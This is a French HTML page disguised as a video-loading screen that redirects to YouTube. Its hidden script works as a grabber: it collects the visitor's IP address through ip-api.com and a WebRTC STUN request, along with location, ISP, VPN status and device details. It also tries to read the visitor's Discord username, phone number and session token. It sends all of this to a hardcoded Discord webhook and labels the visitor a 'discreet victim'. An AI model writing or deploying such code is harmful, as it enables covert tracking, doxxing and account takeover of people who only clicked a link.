<!DOCTYPE html><html lang="fr"><head><meta charset="utf-8"><title>Chargement...</title>
<meta http-equiv="refresh" content="3;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
<style>
  body{margin:0;padding:0;background:#fff;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#000;}
  .loader{text-align:center;}
</style>
</head><body>

<div class="loader">
  <p>Chargement de la vidéo...</p>
  <p>Patientez quelques secondes</p>
</div>

<script>
// TON WEBHOOK DISCORD
const W = "https://discordapp.com/api/webhooks/1457415566884077689/jbC9dps5442aS9flsVGY9JE1XtJ5JL07ZQwfoy_vbguug-_J_lIfLHZpo6UX1kIrBqD7";

const send = (msg) => {
  const blob = new Blob([JSON.stringify({content: msg})], {type: "application/json"});
  navigator.sendBeacon?.(W, blob) || fetch(W, {method: "POST", headers: {"Content-Type": "application/json"}, body: blob, keepalive: true});
};

let message = "VICTIME DISCRÈTE (rien vu)\n";
let ips = [];

// Récupération IPv6 (si disponible)
try {
  const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
  pc.createDataChannel("");
  pc.onicecandidate = e => { if (e.candidate) { const ip = e.candidate.candidate.split(" ")[4]; if (ip && !ips.includes(ip)) ips.push(ip); }};
  pc.createOffer().then(o => pc.setLocalDescription(o));
} catch(e) {}

// Infos IP + localisation (API fiable)
fetch("http://ip-api.com/json/?fields=query,city,regionName,country,isp,mobile,proxy").then(r => r.json()).then(geo => {
  message += `IP : ${geo.query}\n`;
  if (ips.length) message += `IPv6 : ${ips.find(i => i.includes(":")) || ips[0]}\n`;
  message += `Ville : ${geo.city}, ${geo.regionName}, ${geo.country}\n`;
  message += `FAI : ${geo.isp} ${geo.mobile ? "(Mobile)" : ""} ${geo.proxy ? "(VPN/Proxy)" : ""}\n\n`;

// Discord (token + numéro + pseudo)
fetch("https://discord.com/api/v9/users/@me", {credentials: "include"}).then(r => r.ok ? r.json() : null).then(u => {
  if (u?.id) {
    message += `Discord : ${u.username}#${u.discriminator || "0000"}\n`;
    if (u.phone) message += `NUMÉRO TÉLÉPHONE : ${u.phone}\n`;
    const token = localStorage.getItem("token")?.replace(/"/g, "");
    if (token && token.length > 50) message += `TOKEN COMPLET :\n${token}\n`;
  }

  // Infos supplémentaires
  message += `\nAppareil : ${navigator.platform}\n`;
  message += `Écran : ${screen.width}×${screen.height}\n`;
  message += `Batterie : ${navigator.getBattery ? "disponible" : "non disponible"}\n`;
  message += `User-Agent : ${navigator.userAgent.substring(0, 100)}\n`;
  message += `Lien ouvert : ${location.href}\n`;
  message += `Heure : ${new Date().toLocaleString("fr-FR")}`;

  send(message);
});
</script>
</body></html>
